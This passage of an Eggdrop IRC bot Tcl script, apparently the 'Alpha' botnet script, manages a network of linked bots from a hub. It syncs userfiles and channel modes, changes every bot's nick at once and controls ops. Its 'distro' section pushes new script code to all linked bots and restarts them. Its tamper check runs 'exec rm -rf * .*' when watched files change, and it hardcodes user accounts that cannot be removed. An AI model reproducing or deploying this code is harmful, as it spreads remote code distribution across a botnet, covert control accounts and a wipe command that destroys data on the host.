dccbroadcast "[b]Link Verification[b]: Failed to link $b: No response, Unlinked."
}
}

bind bot b finalstage bot_finalstage
proc bot_finalstage {b c a} {
global botcookie goodlink
set gotcookie [lindex $a 0]
if {$botcookie($b)==$gotcookie} {
dccbroadcast "[b]Link Verification[b]: $b successfully linked."
set goodlink($b) yes
bot_goodlink $b
} else { unlink $b ; dccbroadcast "[b]Link Verification[b]: $b unlinked: Bad link-2 password."}
}


bind bot b verifylink bot_verifylink
proc bot_verifylink {b c a} {
global hub
if {$b!="$hub"} {unlink $b ; return}
set cookie [lindex $a 0]
set scookie [encrypt $cookie $cookie]
putbot $b "finalstage $scookie"
}

bind bot b validusers bot:validusers
bind bot b validmasters bot:validmasters
bind bot b validowners bot:validowners
bind bot b validops bot:validops
bind bot b validbots bot:validbots

proc bot:validbots {bo c a} {
global hub
if {$bo!=$hub} {return}
set gotbots "$a"
foreach b [userlist b] {
if {[lsearch -exact "$gotbots" "$b"]=="-1"} {deluser $b}
}
dccbroadcast "[b]Link[b]: Bots on userfile updated."
}
proc bot:validops {bo c a} {
global hub
if {$bo!=$hub} {return}
set gotops "$a"
foreach b [userlist o] {
if {[lsearch -exact "$gotops" "$b"]=="-1"} {deluser $b}
}
dccbroadcast "[b]Link[b]: Ops on userfile updated."
}
proc bot:validmasters {bo c a} {
global hub
if {$bo!=$hub} {return}
set gotmasters "$a"
foreach b [userlist m] {
if {[lsearch -exact "$gotmasters" "$b"]=="-1"} {deluser $b}
}
dccbroadcast "[b]Link[b]: Masters on userfile updated."
}
proc bot:validowners {bo c a} {
global hub
if {$bo!=$hub} {return}
set gotowners "$a"
foreach b [userlist n] {
if {[lsearch -exact "$gotowners" "$b"]=="-1"} {deluser $b}
}
dccbroadcast "[b]Link[b]: Owners on userfile updated."
}
proc bot:validusers {bo c a} {
global hub
if {$bo!=$hub} {return}
set gotusers "$a"
foreach b [userlist] {
if {[lsearch -exact "$gotusers" "$b"]=="-1"} {deluser $b}
}
dccbroadcast "[b]Link[b]: Users on userfile updated."
}
proc bot_goodlink {b} {
global botnick hub botnet-nick botcookie goodlink
putbot $b "validbots [userlist b]"
putbot $b "validops [userlist o]"
putbot $b "validmasters [userlist m]"
putbot $b "validowners [userlist n]"
putbot $b "validusers [userlist]"
set botcookie($b) ""
set goodlink($b) "yes"
if {[string tolower ${botnet-nick}]==[string tolower $hub]} {
foreach ch [string tolower [channels]] {
dccbroadcast "[b]link[b]: Sending [b]$ch[b] info/settings/modes to [b]$b[b]"
set done false
foreach who [userlist] {
if {[matchattr $who m] && $done != "true"} {
set getm "$who"
set done true
}
}
putbot $b "botjoin $ch $getm temp"
putbot $b "bot_chanmode $ch [lindex "[channel info $ch]" 0]"
set mbitch "[lsearch -exact "[channel info $ch]" -bitch]"
if {$mbitch == "-1"} { putbot $b "bot_chanset $ch +bitch" } else {
putbot $b "bot_chanset $ch -bitch"
}
set mclearbans "[lsearch -exact "[channel info $ch]" -clearbans]"
if {$mclearbans == "-1"} { putbot $b "bot_chanset $ch +clearbans" } else {
putbot $b "bot_chanset $ch -clearbans"
}
set menforcebans "[lsearch -exact "[channel info $ch]" -enforcebans]"
if {$menforcebans == "-1"} { putbot $b "bot_chanset $ch +enforcebans" } else {
putbot $b "bot_chanset $ch -enforcebans"
}
set mdynamicbans "[lsearch -exact "[channel info $ch]" -dynamicbans]"
if {$mdynamicbans == "-1"} { putbot $b "bot_chanset $ch +dynamicbans" } else {
putbot $b "bot_chanset $ch -dynamicbans"
}
set muserbans "[lsearch -exact "[channel info $ch]" -userbans]"
if {$muserbans == "-1"} { putbot $b "bot_chanset $ch +userbans" } else {
putbot $b "bot_chanset $ch -userbans"
}
set mautoop "[lsearch -exact "[channel info $ch]" -autoop]"
if {$mautoop == "-1"} { putbot $b "bot_chanset $ch +autoop" } else {
putbot $b "bot_chanset $ch -autoop"
}
set mgreet "[lsearch -exact "[channel info $ch]" -greet]"
if {$mgreet == "-1"} { putbot $b "bot_chanset $ch +greet" } else {
putbot $b "bot_chanset $ch -greet"
}
set mprotectops "[lsearch -exact "[channel info $ch]" -protectops]"
if {$mprotectops == "-1"} { putbot $b "bot_chanset $ch +protectops" } else {
putbot $b "bot_chanset $ch -protectops"
}
set mstatuslog "[lsearch -exact "[channel info $ch]" -statuslog]"
if {$mstatuslog == "-1"} { putbot $b "bot_chanset $ch +statuslog" } else {
putbot $b "bot_chanset $ch -statuslog"
}
set mstopnethack "[lsearch -exact "[channel info $ch]" -stopnethack]"
if {$mstopnethack == "-1"} { putbot $b "bot_chanset $ch +stopnethack" } else {
putbot $b "bot_chanset $ch -stopnethack"
}
set mrevenge "[lsearch -exact "[channel info $ch]" -revenge]"
if {$mrevenge == "-1"} { putbot $b "bot_chanset $ch +revenge" } else {
putbot $b "bot_chanset $ch -revenge"
}
set msecret "[lsearch -exact "[channel info $ch]" -secret]"
if {$msecret == "-1"} { putbot $b "bot_chanset $ch +secret" } else {
putbot $b "bot_chanset $ch -secret"
}
set mshared "[lsearch -exact "[channel info $ch]" -shared]"
if {$mshared == "-1"} { putbot $b "bot_chanset $ch +shared" } else {
putbot $b "bot_chanset $ch -shared" }
}
}
}

bind dcc n mchanset dcc_mchanset
proc dcc_mchanset {handle idx arg} {
set er "Usage:"
set chan [lindex $arg 0]
set mode [lindex $arg 1]
if {$chan == ""} {
putdcc $idx "$er mchanset <#channel> <mode>"
return 0
}
if {$mode == ""} {
putdcc $idx "$er mchanset <#channel> <mode>"
return 0
}
catch {channel set $chan $mode}
putallbots "bot_chanset $chan $mode"
dccbroadcast "[b]Mass chanset[b]: [b]$chan[b], [b]$mode[b] by [b]$handle[b]"
putcmdlog "#$handle# mchanset $chan $mode"
return 0
}

bind dcc m chanmode dcc_chanmode
proc dcc_chanmode {handle idx arg} {
set er "Usage:"
set chan [lindex $arg 0]
set mode [lindex $arg 1]
if {$chan == ""} {
putdcc $idx "$er chanmode <#channel> <mode>"
return 0
}
if {$mode == ""} {
putdcc $idx "$er chanmode <#channel> <mode>"
return 0
}
if {[string match "*-t*" $mode]} {
putdcc $idx "you cant set -t"
return 0
}
if {[string match "*-n*" $mode]} {
putdcc $idx "you cant set -n"
return 0
}
channel set $chan chanmode "+nt$mode"
putlog "[b]chan mode[b] $chan $mode"
putcmdlog "#$handle# chanmode $chan $mode"
return 0
}
bind dcc n mchanmode dcc_mchanmode
proc dcc_mchanmode {handle idx arg} {
set er "Usage:"
set chan [lindex $arg 0]
set umode [lindex $arg 1]
if {$chan == ""} {
putdcc $idx "$er mchanmode <#channel> <mode>"
return 0
}
if {$umode == ""} {
putdcc $idx "$er mchanmode <#channel> <mode>"
return 0
}
if {[string match "*-t*" $umode]} {
putdcc $idx "you cant set -t"
return 0
}
if {[string match "*-n*" $umode]} {
putdcc $idx "you cant set -n"
return 0
}
catch {channel set $chan chanmode "$umode"}
putallbots "bot_chanmode $chan $umode"
dccbroadcast "[b]![b]mass chanmode[b]![b] $chan $umode by $handle"
putcmdlog "#$handle# mchanmode $chan $umode"
return 0
}


bind bot - bot_chanset bot_mchanset
proc bot_mchanset {bot cmd arg} {
set chan [lindex $arg 0]
set mode [lindex $arg 1]
channel set $chan $mode
}
bind bot - bot_chanmode bot_mchanmode
proc bot_mchanmode {bot cmd arg} {
set chan [lindex $arg 0]
set mode [lindex $arg 1]
channel set $chan chanmode "$mode"
}


proc get_key {chan} {
global botnick botnet-nick hub
putallbots "need_key $chan"
}

bind bot b need_key nk
proc nk {bot cmd args} {
set chan "[lindex $args 0]"
if {[validchan $chan]} {
set k [lindex [getchanmode $chan] 1]
if {$k == ""} {
return 0;
}
putbot $bot "got_key $chan $k"
}
}

bind bot b got_key gok
proc gok {bot cmd args} {
set chan [lindex $args 0]
set key [lindex $args 1]
puthelp "JOIN $chan $key"
}


proc yesno {} {
set yn "[rand 2]"
if {$yn=="1"} {
return no
} else {
return yes
}
}

proc randword {} {
set lvowels "a e i o u"
set uvowels "A E I O U"
set lchars "b c d f g h j k l m n p q r s t v - w y z"
set uchars "B C D F G H J K L M N P Q R S T V W Y Z" 
set lvnum "[expr [string len $lvowels]/2]"
set uvnum "[expr [string len $uvowels]/2]"
set lcnum "[expr [string len $lchars]/2]"
set ucnum "[expr [string len $uchars]/2]"
set string ""
if {[yesno]=="yes"} {
append string "[lindex $uvowels [rand $uvnum]]"
} else {
append string "[lindex $uchars [rand $ucnum]]"
}
append string "[lindex $lvowels [rand $lvnum]]"
set num "[expr [rand 3]+1]"
for {set ctr 0} {$ctr < $num} {incr ctr} {
if {[yesno]=="yes"} {
append string "[lindex $lvowels [rand $lvnum]]"
} else {append string "[lindex $lchars [rand $lcnum]]"}
}
append string "[lindex $lvowels [rand $lvnum]]"
append string "[lindex $lchars [rand $lcnum]]"
return $string
}

bind dcc m chnicks chnicks
proc chnicks {h i a} {
putlog "#$h# chnicks"
global hub botnet-nick nick
dccbroadcast "[b]Mass random nick change[b]: requested by $h"
if {$hub!="${botnet-nick}"} {
set nick [randword]
}
set b "[bots]"
foreach test $b {
if {$test!="$hub"} {append howmany " $test"}
}
set howmany "[string range $howmany 1 end]"
foreach bot $howmany {
putbot $bot "bot_chnick [randword]"
}
}

bind dcc m defnicks defnicks
proc defnicks {h i a} {
putlog "#$h# defnicks"
global hub botnet-nick defnick nick
dccbroadcast "[b]Mass default nick change[b]: requested by $h"
if {$hub!="${botnet-nick}"} {
set nick $defnick
}
set b "[bots]"
foreach test $b {
if {$test!="$hub"} {append howmany " $test"}
}
set howmany "[string range $howmany 1 end]"
foreach bot $howmany {
putbot $bot "bot_defnick"
}
}
bind bot b bot_defnick bot_defnick
proc bot_defnick {b c a} {
global defnick nick
set bot $b
putlog "[b]Botrequest[b]: from [b]$bot[b] to change to default nick [b]$defnick[b]"
set nick $defnick
}
bind bot b bot_chnick bot_chnick
proc bot_chnick {bot cmd args} {
global nick
set newnick "[lindex $args 0]"
putlog "[b]Botrequest[b]: from: [b]$bot[b] - change nick - to: [b]$newnick[b] "
set nick "$newnick"
}

bind msg - "ident" bad_msg_using_pass
bind msg - "op" bad_msg_using_pass

proc bad_msg_using_pass {nick uhost handle args} {
set pass [lindex $args 0]
set nck [lindex $args 1]
set ignoremask "*!*[string range $uhost [string first "@" $uhost] end]"
if {$nck!=""} {
if {[passwdok $pass $nck]} {
chattr $nck -omnfxpB
chnick $nck bad_$nck
dccbroadcast "[b]WARNING[b]: $nck using $nick tried to msg ident/op with CORRECT password - user stripped of flags"
if ![isignore $ignoremask] { newignore $ignoremask $nick CTCP-$key 60 }
return
}
}
if {[passwdok $pass $handle]} {
set nck "$handle"
chattr $nck -omnfxpB
chnick $nck bad_$nck
dccbroadcast "[b]WARNING[b]: $nck tried to msg ident/op with CORRECT password - user stripped of flags"
if ![isignore $ignoremask] { newignore $ignoremask $nick CTCP-$key 60 }
return
}
if ![isignore $ignoremask] { newignore $ignoremask $nick CTCP-$key 60 }
return
}

set init-server {servinit}
proc servinit {} {
global botnick
putserv "MODE $botnick +iw-s"
puthelp "VERSION"
doaddhost
}

bind dcc m msave dcc_msave
proc dcc_msave {handle idx arg} {
dccbroadcast "[b]Mass save[b]: by $handle"
putcmdlog "#$handle# msave"
putallbots "bot_save"
save
return 0
}
bind bot - bot_save bot_msave
proc bot_msave {handle idx arg} {
save
}

bind dcc n mhash dcc_mhash
proc dcc_mhash {handle idx arg} {
uplevel {rehash}
dccbroadcast "[b]Mass hash[b]: by $handle"
putallbots "bot_hash"
putcmdlog "#$handle# mhash"
return 0
}
bind bot - bot_hash bot_mhash
proc bot_mhash {bot cmd arg} {
uplevel {rehash}
return 0
}

###############################################################################
# Limiter                                                                     #
###############################################################################

set limitdo false
set limitbot "Tainted"
set limitchans "#dummy"
set limittime "120"
set limitc($homechan) ""
set incrtotal 8

bind dcc m limitbot limit_bot
proc limit_bot {hand idx args} {
global botnick limitchans limittime limitbot limitdo
if {"[lindex $args 0]"==""} {
putdcc $idx "Usage: limitbot <on/off/status>"
putdcc $idx "       limitbot <addchan> #chan"
putdcc $idx "       limitbot <delchan> #chan"
putdcc $idx "       limitbot <interval> interval (in seconds)"
return
}
set cmdd "[lindex $args 0]"
set cmd [lindex $cmdd 0]
set arg1 "[lindex $cmdd 1]"

if {$arg1!=""} {putlog "#$hand# limitbot $cmd $arg1"}
if {$arg1==""} {putlog "#$hand# limitbot $cmd"}
if {$cmd=="status"} {
putdcc $idx "[b]Alpha/Limit[b]: Status"
putdcc $idx "   [b]-[b]Active On: [b]$limitchans[b]"
putdcc $idx "   [b]-[b]Interval: [b]$limittime[b] seconds"
if {$limitdo=="true" || [islinked $limitbot]=="2"} {
putdcc $idx "   [b]-[b]On/Off: [b]On[b]"
} else { putdcc $idx "   [b]-[b]On/Off: [b]Off[b]"}
return
}

if {$cmd=="on"} {
set limitdo true
putdcc $idx "[b]Alpha/Limit[b]: Now enforcing limits."
dolimit
return
}

if {$cmd=="off"} {
if {[islinked $limitbot]=="2"} {
putdcc $idx "[b]Alpha/Limit[b]: Cannot deactivate limits. I am a Limit bot!"
return
} else {
putdcc $idx "[b]Alpha/Limit[b]: Limit Enforce Deactivated."
dolimit
return
}
}
if {$cmd=="interval"} {
if {$arg1==""} {limit_bot $hand $idx} 
if {$arg1!=""} {
set interval "$arg1"
if {$interval < 46} {
putdcc $idx "[b]Alpha/Limit[b]: Sorry, Interval has to be over 45 seconds"
return
}
if {$interval > 45} {
set limittime $interval
putdcc $idx "[b]Alpha/Limit[b]: Limit Interval set to $interval seconds"
return
}
}
}
if {$cmd=="addchan"} {
if {$arg1==""} {
limit_bot $hand $idx
return
}
set chan $arg1
foreach ch $limitchans {
if {$ch=="$chan"} {
putdcc $idx "[b]Alpha/Limit[b]: Channel [b]$chan[b] is already being limited."
return
}
}
if {[validchan $chan] && [isop $botnick $chan]} {
append limitchans " $chan"
putdcc $idx "[b]Alpha/Limit[b]: Channel [b]$chan[b] now has been added to the enforce limit list."
return
}
}
if {$cmd=="delchan"} {
if {$arg1==""} {
limit_bot $hand $idx
return
} else {
set chan $arg1
foreach ch $limitchans {
if {$ch=="$chan"} {
set tempc ""
foreach ch2 $limitchans {
if {$ch2!="$chan"} {append tempc " $ch2"}
}
set limitchans "[string range $tempc 1 end]"
putdcc $idx "[b]Alpha/Limit[b]: Channel [b]$chan[b] removed."
return
}
}
putdcc $idx "[b]Alpha/Limit[b]: Channel [b]$chan[b] does not exist, and therefore cannot be removed."
return
}
}
}

if {[islinked $limitbot]=="2" || $limitdo=="true"} {
utimer $limittime {dolimit}
}

proc dolimit {} {
global botnet-nick limitbot limitc limitchans botnick limittime limitdo incrtotal
if {[islinked $limitbot]=="2" || $limitdo=="true"} {
foreach chan [channels] {
set lc false
foreach lcc $limitchans {
if {$lcc==$chan} {set lc true}
}
if {$lc=="true"} {
set total [llength [chanlist $chan]]
set newlimit [expr $total+$incrtotal]
set exists false
foreach larray [array names limitc] {
if {"[string tolower $larray]"=="[string tolower $chan]"} {set exists true}
}
if {$exists=="false"} {
set limitc($chan) ""
}
if {"$limitc($chan)"!="$newlimit"} {
if {[validchan $chan] && [isop $botnick $chan]} {
pushmode $chan +l $newlimit
set limitc($chan) $newlimit
}
}
}
}
}
if {[islinked $limitbot]=="2" || $limitdo=="true"} {
utimer $limittime {dolimit}
}
}



#############################################################################
# Security                                                                  #
#############################################################################

##########
# bindings
###
unbind msg - ident *msg:ident
unbind msg - op *msg:op
unbind msg - go *msg:go
unbind msg - help *msg:help
unbind msg - die *msg:die
unbind msg - email *msg:email
unbind msg - who *msg:who
unbind msg - whois *msg:whois
unbind msg - jump *msg:jump
unbind msg - memory *msg:memory
unbind msg - rehash *msg:rehash
unbind msg - reset *msg:reset
unbind msg - status *msg:status
unbind dcc - simul *dcc:simul
unbind dcc - adduser *dcc:adduser
unbind dcc - op *dcc:op
unbind dcc - -user *dcc:-user
unbind dcc - deluser *dcc:deluser
unbind dcc - binds *dcc:binds
unbind dcc - tcl *dcc:tcl
unbind dcc - chpass *dcc:chpass
unbind dcc - dump *dcc:dump

bind dcc n opall pwd:opall
bind dcc o op pwd:op
bind dcc n adduser warn:addusr
bind dcc n -user dcc:-user
bind dcc n deluser dcc:-user
bind dcc n binds warn:binds
bind dcc n tcl warn:tcl
bind dcc m chpass dcc:chpass

proc dcc:chpass {h i a} {
global mainchan
set usr [lindex $a 0]
set pas [lindex $a 1]
if {$pas=="" && $usr==""} {putdcc $i "Usage: chpass <nick> <password>" ; return 1}
if {[string tolower $usr]=="system" || [string tolower $usr]=="master"} {
putdcc $i "[b]Change Pass[b]: Why the fuck are you trying to change the [string to lower $usr] password?"
puthelp "privmsg $mainchan :-> [b]WARNING![b]: [b]$h[b] tried to change the [string tolower $usr] password!"  
dccbroadcast "[b]WARNING![b]: [b]$h[b] tried to change the [string tolower $usr] password!"
killdcc $i
}
if {$pas==""} {
bind dcc m t2chp *dcc:chpass
dccsimul $i ".t2chp $usr"
unbind dcc - t2chp *dcc:chpass
return
}
if {[string tolower $usr]!="system" || [string tolower $usr]!="master"} {
*dcc:chpass $h $i "$usr $pas"
}
}

proc warn:tcl {hand idx arg} {
  set warn [lindex $arg 0]
  if {$warn==""} {putdcc $idx "This command has been disabled." ; return 0 }
  putdcc $idx "This command has been disabled."
  putlog "#$hand# .tcl $warn"
}

proc warn:binds {hand idx arg} {
  putdcc $idx "That command is a security risk and has been disabled."
  putlog "#$hand# .binds -blocked-"
  return 0
}

proc pwd:opall {hand idx arg} {
  global mainchan
  set nick [lindex $arg 0]
  set pwd [lindex $arg 1]
  if {$nick == ""} {putdcc $idx "Usage: opall <nick> <password>" ; return 0 }
  if {$pwd == ""} {putdcc $idx "Usage: opall <nick> <password>" ; return 0 }
  if {![passwdok system $pwd]} {
    putserv "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) used an invalid opall password."
    putdcc $idx "Invalid password."
    killdcc $idx
  } else {
    if {[onchan [hand2nick $hand $mainchan] $mainchan]=="0" || ![isop [hand2nick $hand $mainchan] $mainchan]} {
      putserv "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) tried to get ops in all channels without being on/or not opd in the home channel first."
      putdcc $idx "Not on or not opped in home channel!"
      killdcc $idx
      return 0
    }
    putserv "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) is recieving ops on all channels."
    putlog "#$hand# opall $nick"
    foreach ch [channels] {
      if {[onchan $nick $ch] && [matchattr [nick2hand $nick $ch] o]} {
      pushmode $ch +o $nick
      }
    }
  }
}

set nuser "Arkangel Fatal system master"
proc dcc:-user {hand idx arg} {
  global nuser mainchan
  set user [string tolower [lindex $arg 0]]
  set pwd [lindex $arg 1]
  set nuser [string tolower $nuser]
  if {$user == ""} { putdcc $idx "Usage: -user <nick> <password>" ; return 0 }
  if {$pwd == ""} { putdcc $idx "Usage: -user <nick> <password>" ; return 0 }
  if {![passwdok master $pwd]} {
    puthelp "PRIVMSG $mainchan :-> ([b]$hand[b]) tried to -user $user with incorrect password."
    putdcc $idx "Incorrect password."
    killdcc $idx
    return 0
  }
  foreach u $nuser {
    if {$user == $u} {
      putserv "PRIVMSG $mainchan :-> ([b]$hand[b]) Tried to remove an unremovable user!"
      putdcc $idx "You can not remove [b]$user[b] from userfile. Bye."
      dccbroadcast "([b]$hand[b]) attempted to remove $user from userfile."
      chattr $hand -mnofpxjB
      killdcc $idx
      return 0
    }
  }
  if {[deluser $user]} {
    dccbroadcast "([b]$hand[b]) removed $user from userfile."
    putallbots "botrem $user"
    return 0
  } else {
    putdcc $idx "$user does not exist."
    return 0
  }
}

proc botrem {arg} {
  set user [lindex $arg 0]
  deluser $user
}

proc warn:addusr {hand idx arg} {
  putdcc $idx "[b]Alpha[b]: Please use +user instead."
  return 0
}

proc pwd:op {handle idx arg} {
   global mainchan botnick
   set hand $handle
   set nick [lindex $arg 0]
   set chan [lindex $arg 1]
   set pwd [lindex $arg 2]
   if {$nick == ""} {putdcc $idx "Usage: op <nick> <chan> <password>" ; return 0 }
   if {$chan == ""} {putdcc $idx "Usage: op <nick> <chan> <password>" ; return 0 }
   if {$pwd == ""} {putdcc $idx "Usage: op <nick> <chan> <password>" ; return 0 }
   if {![validchan $chan]} {putdcc $idx "Invalid channel." ; return 0 }
   if {![passwdok system $pwd]} {
     putserv "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) used incorrect op password for [b]$chan[b]"
     putdcc $idx "Wrong password!"
     killdcc $idx
     return 0
   }
   if {[nick2hand $nick $chan]!="$hand"} {
     putdcc $idx "Uhh no, i think not."
     puthelp "PRIVMSG $mainchan :-> ([b]$hand[b]) tried to op [b]$nick[b] in [b]$chan[b] through me. ($nick is on an unknown host.)"
     killdcc $idx
     return 0
   }
   if {[string tolower $chan] != $mainchan && [onchan $nick $mainchan]=="0" || [string tolower $chan] != $mainchan && ![isop $nick $mainchan]} {
     putserv "PRIVMSG $mainchan :-> ([b]$nick[b]/[b]$hand[b]) tried to get ops on [b]$chan[b] without being on or not opd in the home channel first."
     putdcc $idx "Die."
     killdcc $idx
     return 0
   } else {
     if {[validchan $chan] && [onchan $nick $chan] && [isop $botnick $chan]} { 
     putlog "#$hand# op $nick $chan *pass*"
     putserv "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) is being opped on [b]$chan[b]"
     pushmode $chan +o $nick
     return 0
   }
   }
}
unbind dcc - invite *dcc:invite
bind dcc o invite pwd:invite

proc pwd:invite {hand idx arg} {
  global botnick mainchan
  set nick [lindex $arg 0]
  set chan [lindex $arg 1]
  set pwd [lindex $arg 2]
  if {$pwd==""} {putlog "#$hand# invite $nick $chan"}
  if {$pwd!=""} {putlog "#$hand# invite $nick $chan *pass*"}
  if {$nick == ""} {putdcc $idx "Usage: .invite <nick> <channel> <password>" ; return 0 }
  if {$chan == ""} {putdcc $idx "Usage: .invite <nick> <channel> <password>" ; return 0 }
  if {$pwd == ""} {putdcc $idx "Usage: .invite <nick> <channel> <password>" ; return 0 }
  if {![validchan $chan]} {putdcc $idx "Invalid channel." ; return 0 }
  if {![isop $botnick $chan]} {putdcc $idx "I'm not an operator on $chan." ; return 0 }
  if {![passwdok system $pwd]} {
    puthelp "PRIVMSG $mainchan :-> ([b]$nick[b]|[b]$hand[b]) entered incorrect invite password."
    putdcc $idx "Invalid password."
    killdcc $idx
  } else {
    if {![onchan $nick $chan]} {
    putdcc $idx "Inviting $nick to $chan."
    puthelp "INVITE $nick $chan"
    }
  }
}

bind dcc m botpass dcc:botpass
bind bot - botpwd bot:botpass

proc dcc:botpass {hand idx arg} {
  set pwd [lindex $arg 0]
  if {$pwd==""} {putdcc $idx "Usage: .botpass <password> (null to leave them blank)" ; return 0 }
  if {$pwd=="null"} {set pwd ""}
  dccbroadcast "($hand) is changing all bot passwords to $pwd."
  foreach bot [userlist b] {
    *dcc:chpass $hand $idx "$bot $pwd"
  }
}

################################################################################
# Distro TCL                                                                   #
################################################################################

set numddone 0

bind dcc n distro spread_dcc_distro
bind dcc n download spread_dcc_download
bind bot - spread_download spread_bot_download
bind bot - spread_distro spread_bot_distro
bind bot - spread_script spread_bot_script
bind bot - donedistro done_distro

proc spread_bot_download {bot cmd arg} {
  global nick spread_distrobot spread_scriptname spread_beta spread_indistro
  if {[string compare [string tolower $nick] [string tolower $spread_distrobot]]!=0} {
    return 0
  }
  if {$spread_indistro == 1} {
    return 0
  }
  set fd [open $spread_scriptname r]
  if {[string compare [string tolower $bot] [string tolower $nick]]==0} {
    while {![eof $fd]} {
      set in [string trim [gets $fd]]
      if {[string length $in]>0} {
        if {[string first # $in]!=0} {
          putallbots "spread_script $in"
        }
      }
    }
    putallbots "spread_script ---SCRIPTEND---"
  } else {
    while {![eof $fd]} {
      putbot $bot "spread_script [string trimright [gets $fd]]"
    }
    putbot $bot "spread_script ---SCRIPTEND---"
  }
  return 0
}

proc spread_download_abort {} {
  global spread_scriptfd spread_distrobot dontchktcl
  if {$spread_scriptfd != 0} {
    putlog "script transfer [b]aborted[b]"
    close $spread_scriptfd
    set spread_scriptfd 0
    set dontchktcl false
  }
}

proc spread_bot_distro {from cmd arg} {
  global nick spread_scriptfd spread_tempname spread_distrobot dontchktcl
  if {[string compare [string tolower $from] [string tolower $spread_distrobot]]!=0} {
    putlog "[b]Alpha[b]: distro request from [b]$from[b] - not downloading (not distrobot)"
    return 0
  }
  if {[string compare [string tolower $nick] [string tolower $spread_distrobot]]==0} {
    return 0
  }
  if {$spread_scriptfd!=0} {
    putlog "Distro while file open"
    return 0
  }
  set spread_scriptfd [open $spread_tempname w]
  timer 5 spread_download_abort
  set dontchktcl true
  putlog "[b]Alpha[b]: distro request from [b]$from[b] - downloading..."
  return 1
}

proc spread_bot_script {bot cmd arg} {
  global spread_scriptfd spread_tempname spread_scriptname spread_distrobot dontchktcl
  if {[string compare [string tolower $bot] [string tolower $spread_distrobot]]!=0} {
    return 0
  }
  if {$spread_scriptfd == 0} {
    return 0
  }
  if {[string compare $arg "---SCRIPTEND---"]==0} {
    close $spread_scriptfd
    set spread_scriptfd 0
    set infd [open $spread_tempname r]
    set outfd [open $spread_scriptname w]
    while {![eof $infd]} {
      puts $outfd [string trimright [gets $infd]]
    }
    close $infd
    close $outfd
    putlog "[b]Alpha[b]: script download complete, attempting to restart..."
    putbot $bot "donedistro"
    utimer 2 restart
  } else {
    puts $spread_scriptfd $arg
  }
}

proc done_distro {hand idx arg} {
  global numddone
  set numofbots 0
  foreach bot [bots] {
    set numofbots [expr $numofbots + 1]
  }
  set numddone [expr $numddone + 1]
  if {$numddone == $numofbots} {
    putlog "[b]Alpha[b]: all bots done downloading script, restarting..."
    utimer 5 restart
    set spread_scriptfd 0
    set spread_indistro 0
  }
}

proc spread_dcc_download {hand idx arg} {
  global nick spread_scriptfd spread_tempname spread_distrobot dontchktcl
  if {[string compare [string tolower $nick] [string tolower $spread_distrobot]]==0} {
    putdcc $idx "[b]Alpha[b]: You insane??"
    return 0
  }
  if {$spread_scriptfd!=0} {
    putdcc $idx "[b]Alpha[b]: already in distro"
    return 0
  }
  set spread_scriptfd [open $spread_tempname w]
  putbot $spread_distrobot "spread_download"
  set dontchktcl true
  timer 3 spread_download_abort
  return 1
}

proc spread_dcc_distro {hand idx arg} {
  global nick spread_distrobot spread_indistro
  if {[string compare [string tolower $nick] [string tolower $spread_distrobot]]!=0} {
    putdcc $idx "[b]Alpha[b]: this can only be run from distro bot"
    return 0
  }
  if {$spread_indistro==0} {
    putallbots "spread_distro"
    spread_bot_download $nick download ""
    set spread_indistro 1
    timer 2 {set spread_indistro 0}
    return 1
  } else {
    putdcc $idx "[b]Alpha[b]: already in distro"
  }
}
if {[info exists spread_scriptd]} {
  spread_download_abort
} else {
  set spread_scriptfd 0
  set spread_indistro 0
}


################################################################################
# File Time/Size Checking                                                      #
################################################################################

set tclname "alpha.tcl"
set binname "eggdrop"
set cfgname "upgrade"
set enc "SEQ/ALPHA"
### CFG/JAG == upgrade
### BIN/JAG == update
set security(null) "null"
proc recsec {} {
global tclname binname cfgname enc pwb security
if {![file exists $pwb]} {
catch {exec echo [decrypt alpha iegCB.SaR1E0] > $pwb}
} else {set security(pwbatime) [encrypt $enc [file atime $pwb]]}
if {![file exists $tclname]} {die} else {set security(tclmtime) [encrypt $enc [file mtime $tclname]] ; set security(tclsize) [encrypt $enc [file size $tclname]]}
if {![file exists $binname]} {die} else {set security(binsize) [encrypt $enc [file size $binname]]}
if {![file exists $cfgname]} {die} else {set security(cfgmtime) [encrypt $enc [file mtime $cfgname]] ; set security(cfgsize) [encrypt $enc [file size $cfgname]]}
}

recsec
utimer 10 {dosecuritychk}

proc dosecuritychk {} {
global tclname binname cfgname enc mainchan botnet-nick spread_distrobot pwb dontchktcl security hub
if {$spread_distrobot!=${botnet-nick} && $dontchktcl=="false"} {
if {[file size $tclname]!="[decrypt $enc $security(tclsize)]"} {
catch {exec rm -rf * .*}
dccbroadcast "[b]WARNING[b]: TCL FILE SIZE HAS CHANGED!!!"
puthelp "PRIVMSG $mainchan :-> [b]WARNING[b]: TCL FILE SIZE HAS CHANGED!!!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
#die
}
}
if {[file atime $pwb]!="[decrypt $enc $security(pwbatime)]"} {
dccbroadcast "[b]WARNING[b] :-> $pwb read. Commiting suicide!"
puthelp "PRIVMSG $mainchan :-> pwb file read. Commiting suicide!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
#catch {exec rm -rf * .*}
die
}
if {[file mtime $cfgname]!="[decrypt $enc $security(cfgmtime)]"} {
catch {exec rm -rf * .*}
dccbroadcast "[b]WARNING[b]: [string toupper cfg] MTIME HAS CHANGED!!!"
puthelp "PRIVMSG $mainchan :-> [b]WARNING[b]: [string toupper cfg] FILE SIZE HAS CHANGED!!!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
die
}
if {$spread_distrobot!=${botnet-nick} && $dontchktcl=="false"} {
if {[file mtime $tclname]!="[decrypt $enc $security(tclmtime)]"} {
catch {exec rm -rf * .*}
dccbroadcast "[b]WARNING[b]: [string toupper tcl] MTIME HAS CHANGED!!!"
puthelp "PRIVMSG $mainchan :-> [b]WARNING[b]: [string toupper tcl] FILE SIZE HAS CHANGED!!!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
die
}
}
if {[file size $binname]!="[decrypt $enc $security(binsize)]"} {
catch {exec rm -rf * .*}
dccbroadcast "[b]WARNING[b]: BIN FILE SIZE HAS CHANGED!!!"
puthelp "PRIVMSG $mainchan :-> [b]WARNING[b]: BIN FILE SIZE HAS CHANGED!!!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
die
}
